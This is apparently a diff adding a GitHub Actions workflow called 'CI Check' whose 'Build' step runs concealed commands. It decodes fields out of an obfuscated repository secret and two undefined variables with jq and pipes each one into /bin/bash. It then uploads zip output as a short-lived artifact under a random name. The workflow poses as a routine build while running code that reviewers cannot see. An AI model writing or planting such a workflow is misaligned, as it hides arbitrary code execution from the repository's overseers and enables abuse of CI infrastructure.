@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          bdks4: ${{ secrets.bdks4 }}
+        run: |
+          printf '%s' "$bdks4" | jq -r .evoi39496 | /bin/bash
+          echo $skv6 | jq -r .dvt87 | /bin/bash
+          echo $r1 | jq -r .azivh7 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: GH31TfUe
+          path: "*.zip"
+          retention-days: 1
